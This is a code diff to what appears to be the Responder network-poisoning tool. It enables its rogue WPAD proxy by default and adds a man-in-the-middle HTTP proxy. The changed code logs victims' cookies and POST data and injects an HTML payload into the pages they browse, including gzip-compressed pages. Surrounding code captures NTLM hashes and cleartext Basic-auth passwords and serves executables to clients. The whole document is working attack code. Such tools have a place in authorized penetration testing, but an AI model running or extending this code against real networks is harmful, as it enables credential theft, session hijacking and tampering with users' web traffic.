@@ -16,7 +16,7 @@
 # You should have received a copy of the GNU General Public License
 # along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
-import sys,struct,SocketServer,re,optparse,socket,thread,Fingerprint,random,os,ConfigParser
+import sys,struct,SocketServer,re,optparse,socket,thread,Fingerprint,random,os,ConfigParser,BaseHTTPServer, select,urlparse,zlib
 from SocketServer import TCPServer, UDPServer, ThreadingMixIn, StreamRequestHandler, BaseRequestHandler,BaseServer
 from Fingerprint import RunSmbFinger,OsNameClientVersion
 from odict import OrderedDict
@@ -36,7 +36,7 @@ parser.add_option('-r', '--wredir',action="store", help="Set this to enable answ
 
 parser.add_option('-f','--fingerprint', action="store", dest="Finger", help = "This option allows you to fingerprint a host that issued an NBT-NS or LLMNR query.", metavar="Off", choices=['On','on','off','Off'], default="Off")
 
-parser.add_option('-w','--wpad', action="store", dest="WPAD_On_Off", help = "Set this to On or Off to start/stop the WPAD rogue proxy server. Default value is Off", metavar="Off", choices=['On','on','off','Off'], default="Off")
+parser.add_option('-w','--wpad', action="store", dest="WPAD_On_Off", help = "Set this to On or Off to start/stop the WPAD rogue proxy server. Default value is On", metavar="Off", choices=['On','on','off','Off'], default="On")
 
 parser.add_option('--lm',action="store", help="Set this to On if you want to force LM hashing downgrade for Windows XP/2003 and earlier. Default value is Off", metavar="Off",dest="LM_On_Off", choices=['On','on','off','Off'], default="Off")
 
@@ -1042,25 +1042,18 @@ def GrabCookie(data,host):
           logging.warning(NoCookies)
           return NoCookies
 
-def ServeWPADOrNot(on_off):
-    if on_off == "ON":
-       return True
-    if on_off == "OFF":
-       return False
-
 def WpadCustom(data,client):
-    if ServeWPADOrNot(WPAD_On_Off):
-       b = re.search('(/wpad.dat|/*\.pac)', data)
-       if b:
-          Message = "[+]WPAD file sent to: %s"%(client)
-          if Verbose:
-             print Message
-          logging.warning(Message)
-          buffer1 = WPADScript(Payload=WPAD_Script)
-          buffer1.calculate()
-          return str(buffer1)
-       else:
-          return False
+    Wpad = re.search('(/wpad.dat|/*\.pac)', data)
+    if Wpad:
+       Message = "[+]WPAD file sent to: %s"%(client)
+       if Verbose:
+          print Message
+       logging.warning(Message)
+       buffer1 = WPADScript(Payload=WPAD_Script)
+       buffer1.calculate()
+       return str(buffer1)
+    else:
+       return False
 
 # Function used to check if we answer with a Basic or NTLM auth. 
 def Basic_Ntlm(Basic):
@@ -1117,8 +1110,8 @@ def GrabURL(data, host):
 
 #Handle HTTP packet sequence.
 def PacketSequence(data,client):
-    a = re.findall('(?<=Authorization: NTLM )[^\\r]*', data)
-    b = re.findall('(?<=Authorization: Basic )[^\\r]*', data)
+    Ntlm = re.findall('(?<=Authorization: NTLM )[^\\r]*', data)
+    BasicAuth = re.findall('(?<=Authorization: Basic )[^\\r]*', data)
     if ServeEXEOrNot(Exe_On_Off) and re.findall('.exe', data):
        File = config.get('HTTP Server', 'ExecFilename')
        buffer1 = ServerExeFile(Payload = ServeEXE(data,client,File),filename=File)
@@ -1133,8 +1126,8 @@ def PacketSequence(data,client):
           buffer1 = ServeAlwaysNormalFile(Payload = ServeEXE(data,client,FILENAME))
           buffer1.calculate()
           return str(buffer1)
-    if a:
-       packetNtlm = b64decode(''.join(a))[8:9]
+    if Ntlm:
+       packetNtlm = b64decode(''.join(Ntlm))[8:9]
        if packetNtlm == "\x01":
           GrabURL(data,client)
           GrabCookie(data,client)
@@ -1145,24 +1138,19 @@ def PacketSequence(data,client):
           buffer1 = str(t)                    
           return buffer1
        if packetNtlm == "\x03":
-          NTLM_Auth= b64decode(''.join(a))
+          NTLM_Auth= b64decode(''.join(Ntlm))
           ParseHTTPHash(NTLM_Auth,client)
-          if re.search('(/wpad.dat|/*\.pac)', data):
-             buffer1 = WPADScript(Payload=WPAD_Script) #Fix login prompt for wpad.
-             buffer1.calculate()
-             return str(buffer1)
-          else:
-             buffer1 = IIS_Auth_Granted(Payload=config.get('HTTP Server','HTMLToServe'))
-             buffer1.calculate()
-             return str(buffer1)
-    if b:
+          buffer1 = IIS_Auth_Granted(Payload=config.get('HTTP Server','HTMLToServe'))
+          buffer1.calculate()
+          return str(buffer1)
+    if BasicAuth:
        GrabCookie(data,client)
        GrabURL(data,client)
        outfile = os.path.join(ResponderPATH,"HTTP-Clear-Text-Password-"+client+".txt")
-       if PrintData(outfile,b64decode(''.join(b))):
-          print "[+]HTTP-User & Password:", b64decode(''.join(b))
-          WriteData(outfile,b64decode(''.join(b)), b64decode(''.join(b)))
-       logging.warning('[+]HTTP-User & Password: %s'%(b64decode(''.join(b))))
+       if PrintData(outfile,b64decode(''.join(BasicAuth))):
+          print "[+]HTTP-User & Password:", b64decode(''.join(BasicAuth))
+          WriteData(outfile,b64decode(''.join(BasicAuth)), b64decode(''.join(BasicAuth)))
+       logging.warning('[+]HTTP-User & Password: %s'%(b64decode(''.join(BasicAuth))))
        buffer1 = IIS_Auth_Granted(Payload=config.get('HTTP Server','HTMLToServe'))
        buffer1.calculate()
        return str(buffer1)
@@ -1191,117 +1179,182 @@ class HTTP(BaseRequestHandler):
 ##################################################################################
 #HTTP Proxy Stuff
 ##################################################################################
-
-def GrabHost(data,host):
-    GET = re.findall('(?<=GET )[^HTTP]*', data)
-    CONNECT = re.findall('(?<=CONNECT )[^HTTP]*', data)
-    POST = re.findall('(?<=POST )[^HTTP]*', data)
-    POSTDATA = re.findall('(?<=\r\n\r\n)[^*]*', data)
-    if GET:
-          HostStr = "[+]HTTP Proxy sent from: %s The requested URL was: %s"%(host,''.join(GET))
-          logging.warning(HostStr)
-          if Verbose:
-             print HostStr
-          return ''.join(GET),None
-    if CONNECT:
-          Host2Str = "[+]HTTP Proxy sent from: %s The requested URL was: %s"%(host,''.join(CONNECT))
-          logging.warning(Host2Str)
-          if Verbose:
-             print Host2Str
-          return ''.join(CONNECT), None
-    if POST:
-          Host3Str = "[+]HTTP Proxy sent from: %s The requested URL was: %s"%(host,''.join(POST))
-          logging.warning(Host3Str)
-          if Verbose:
-             print Host3Str
-          if len(''.join(POSTDATA)) >2:
-             PostData = '[+]The HTTP POST DATA in this request was: %s'%(''.join(POSTDATA))
-             if Verbose:
-                print PostData
-             logging.warning(PostData)
-          return ''.join(POST), ''.join(POSTDATA)
-    else:
-          NoHost = "[+]No host url sent with this request"
-          logging.warning(NoHost)
-          return "NO HOST", None
-
-def ProxyBasic_Ntlm(Basic):
-    if Basic == "ON":
-       return IIS_Basic_407_Ans()
-    if Basic == "OFF":
-       return IIS_Auth_407_Ans()
-
-def ParseDomain(data,client):
-    Host,PostData = GrabHost(data,client)
-    Cookie = GrabCookie(data,client)
-    Message = "Requested URL: %s\nComplete Cookie: %s\nClient IP is: %s\nPOST DATA: %s"%(Host, Cookie, client,PostData)
-    DomainName = re.search('^(.*:)//([a-z\-.]+)(:[0-9]+)?(.*)$', Host)
-    if DomainName:
-       OutFile = os.path.join(ResponderPATH,"HTTPCookies/HTTP-Cookie-"+DomainName.group(2)+"-"+client+".txt")
-       WriteData(OutFile,Message, Message)
-    else:
-       OutFile = os.path.join(ResponderPATH,"HTTPCookies/HTTP-Cookie-"+Host.replace('/','')+"-"+client+".txt")
-       WriteData(OutFile,Message, Message)
-
-#Handle HTTP packet sequence.
-def ProxyPacketSequence(data,client):
-    a = re.findall('(?<=Proxy-Authorization: NTLM )[^\\r]*', data)
-    b = re.findall('(?<=Authorization: Basic )[^\\r]*', data)
-    if ServeEXEOrNot(Exe_On_Off) and re.findall('.exe', data):
-       File = config.get('HTTP Server', 'ExecFilename')
-       buffer1 = ServerExeFile(Payload = ServeEXE(data,client,File),filename=File)
-       buffer1.calculate()
-       return str(buffer1)
-    if ServeEXECAlwaysOrNot(Exec_Mode_On_Off):
-       if IsExecutable(FILENAME):
-          buffer1 = ServeAlwaysExeFile(Payload = ServeEXE(data,client,FILENAME),ContentDiFile=FILENAME)
-          buffer1.calculate()
-          return str(buffer1)
+def HandleGzip(Headers, Content, Payload):
+    if len(Content) > 10:
+       try:
+          unziped = zlib.decompress(Content, 16+zlib.MAX_WBITS)
+       except:
+          return False
+       InjectPayload = Payload
+       Len = ''.join(re.findall('(?<=Content-Length: )[^\r\n]*', Headers))
+       HasHTML = re.findall('(?<=<html)[^<]*', unziped)
+       if HasHTML :
+          if Verbose == True:
+             print 'Injecting: %s into the original page'%(config.get('HTTP Server','HTMLToServe'))  
+          Content = unziped.replace("<html", Payload+"\n<html")
+          ziped = zlib.compress(Content)
+          FinalLen = str(len(ziped))
+          Headers = Headers.replace("Content-Length: "+Len, "Content-Length: "+FinalLen)
+          return Headers+'\r\n\r\n'+ziped
        else:
-          buffer1 = ServeAlwaysNormalFile(Payload = ServeEXE(data,client,FILENAME))
-          buffer1.calculate()
-          return str(buffer1)
-    if a:
-       packetNtlm = b64decode(''.join(a))[8:9]
-       if packetNtlm == "\x01":
-          r = NTLM_Challenge(ServerChallenge=Challenge)
-          r.calculate()
-          t = IIS_407_NTLM_Challenge_Ans()
-          t.calculate(str(r))
-          buffer1 = str(t)
-          return buffer1
-       if packetNtlm == "\x03":
-          NTLM_Auth= b64decode(''.join(a))
-          ParseHTTPHash(NTLM_Auth,client)
-          buffer1 = DitchThisConnection()
-          buffer1.calculate()
-          return str(buffer1)
-    if b:
-       outfile = os.path.join(ResponderPATH,"HTTP-Proxy-Clear-Text-Password-"+client+".txt")
-       WriteData(outfile,b64decode(''.join(b)),b64decode(''.join(b)))
-       print "[+][Proxy]HTTP-User & Password:", b64decode(''.join(b))
-       logging.warning('[+][Proxy]HTTP-User & Password: %s'%(b64decode(''.join(b))))
-       buffer1 = DitchThisConnection()
-       buffer1.calculate()
-       return str(buffer1)
+          return False 
     else:
-       return str(ProxyBasic_Ntlm(Basic))
+       return False
+   
+def InjectData(data, Payload):
+    if len(data.split('\r\n\r\n'))>1:
+       Headers, Content = data.split('\r\n\r\n')
+       RedirectCodes = ['HTTP/1.1 300', 'HTTP/1.1 301', 'HTTP/1.1 302', 'HTTP/1.1 303', 'HTTP/1.1 304', 'HTTP/1.1 305', 'HTTP/1.1 306', 'HTTP/1.1 307']
+       if [s for s in RedirectCodes if s in Headers]:
+          return data
+       if "Content-Encoding: gzip" in Headers:
+          Gzip = HandleGzip(Headers,Content, Payload)
+          if Gzip:
+             return Gzip
+          else:
+             return data
+       if "Content-Type: text/html" in Headers:
+          Len = ''.join(re.findall('(?<=Content-Length: )[^\r\n]*', Headers))
+          HasHTML = re.findall('(?<=<html)[^<]*', Content)
+          if HasHTML :
+             if Verbose == True:
+                print 'Injecting: %s into the original page'%(config.get('HTTP Server','HTMLToServe'))  
+             NewContent = Content.replace("<html", Payload+"\n<html")
+             FinalLen = str(len(NewContent))
+             Headers = Headers.replace("Content-Length: "+Len, "Content-Length: "+FinalLen)
+             return Headers+'\r\n\r\n'+NewContent
+          else:
+             return data
 
-#HTTP Rogue Proxy Server Class
-class HTTPProxy(BaseRequestHandler):
+       else:
+           return data
+
+    else:
+       return data
+
+#Inspired from Tiny HTTP proxy, original work: SUZUKI Hisao.
+class ProxyHandler (BaseHTTPServer.BaseHTTPRequestHandler):
+    __base = BaseHTTPServer.BaseHTTPRequestHandler
+    __base_handle = __base.handle
+ 
+    rbufsize = 0
 
     def handle(self):
-        try:
-           self.request.settimeout(0.1)
-           for x in range(2):
-             data = self.request.recv(8092)
-             ParseDomain(data,self.client_address[0])
-             buffer0 = ProxyPacketSequence(data,self.client_address[0])
-             self.request.sendall(buffer0)
+        (ip, port) =  self.client_address
+        self.__base_handle()
 
-        except Exception:
-           pass#No need to be verbose..
-           self.request.close()
+    def _connect_to(self, netloc, soc):
+        i = netloc.find(':')
+        if i >= 0:
+            host_port = netloc[:i], int(netloc[i+1:])
+        else:
+            host_port = netloc, 80
+        try: soc.connect(host_port)
+        except socket.error, arg:
+            try: msg = arg[1]
+            except: msg = arg
+            self.send_error(404, msg)
+            return 0
+        return 1
+ 
+    def do_CONNECT(self):
+        soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            if self._connect_to(self.path, soc):
+                self.wfile.write(self.protocol_version +
+                                 " 200 Connection established\r\n")
+                self.wfile.write("Proxy-agent: %s\r\n" % self.version_string())
+                self.wfile.write("\r\n")
+                try:
+                   self._read_write(soc, 300)
+                except:
+                   pass
+        finally:
+            soc.close()
+            self.connection.close()
+
+    def do_GET(self):
+        (scm, netloc, path, params, query, fragment) = urlparse.urlparse(
+            self.path, 'http')
+        if scm not in ('http') or fragment or not netloc:
+            self.send_error(400, "bad url %s" % self.path)
+            return
+        soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            if scm == 'http':
+                if self._connect_to(netloc, soc):
+                    soc.send("%s %s %s\r\n" % (self.command,
+                                               urlparse.urlunparse(('', '', path,
+                                                                    params, query,
+                                                                    '')),
+                                               self.request_version))
+                    for headers in self.headers.items():
+                        if "cookie" in headers:
+                           Cookie = self.headers['Cookie']
+                        else:
+                           Cookie = ''
+                    Message = "Requested URL: %s\nComplete Cookie: %s\nClient IP is: %s\n"%(self.path, Cookie, self.client_address[0])
+                    if Verbose == True:
+                       print Message
+                    OutFile = os.path.join(ResponderPATH,"HTTPCookies/HTTP-Cookie-request-"+netloc+"-from-"+self.client_address[0]+".txt")
+                    WriteData(OutFile,Message, Message)
+                    self.headers['Connection'] = 'close'                
+                    del self.headers['Proxy-Connection']
+                    for key_val in self.headers.items():
+                        soc.send("%s: %s\r\n" % key_val)
+                    soc.send("\r\n")
+                    try:
+                      self._read_write(soc, netloc)
+                    except:
+                      pass  
+
+        finally:
+            soc.close()
+            self.connection.close()
+ 
+    def _read_write(self, soc, netloc='', max_idling=30):
+        iw = [self.connection, soc]
+        ow = []
+        count = 0
+        while 1:
+            count += 1
+            (ins, _, exs) = select.select(iw, ow, iw, 1)
+            if exs: 
+               break
+            if ins:
+                for i in ins:
+                    if i is soc: 
+                       out = self.connection
+                       try:
+                          if len(config.get('HTTP Server','HTMLToServe'))>5:
+                             data = InjectData(i.recv(8192), config.get('HTTP Server','HTMLToServe'))
+                          else:
+                             data = i.recv(8192)
+                       except:
+                          pass
+                    else: 
+                       out = soc
+                       data = i.recv(8192)
+                       if self.command == "POST":
+                          Message = "POST data was: %s\n"%(data)
+                          if Verbose == True:
+                             print Message
+                          OutFile = os.path.join(ResponderPATH,"HTTPCookies/HTTP-Cookie-request-"+netloc+"-from-"+self.client_address[0]+".txt")
+                          WriteData(OutFile,Message, Message)
+                    if data:
+                        out.send(data)
+                        count = 0
+            if count == max_idling: 
+               break
+        return None
+
+ 
+    do_HEAD = do_GET
+    do_POST = do_GET
+    do_PUT  = do_GET
+    do_DELETE=do_GET
+ 
+ 
 ##################################################################################
 #HTTPS Server
 ##################################################################################
@@ -1680,7 +1733,7 @@ def Is_HTTPS_On(SSL_On_Off):
 #Function name self-explanatory
 def Is_WPAD_On(on_off):
     if on_off == "ON":
-       return thread.start_new(serve_thread_tcp,('', 3141,HTTPProxy))
+       return thread.start_new(serve_thread_tcp,('', 3141,ProxyHandler))
     if on_off == "OFF":
        return False
 
@@ -1815,6 +1868,7 @@ if __name__ == '__main__':
     except:
         raise
     raw_input()
+
 
 
 
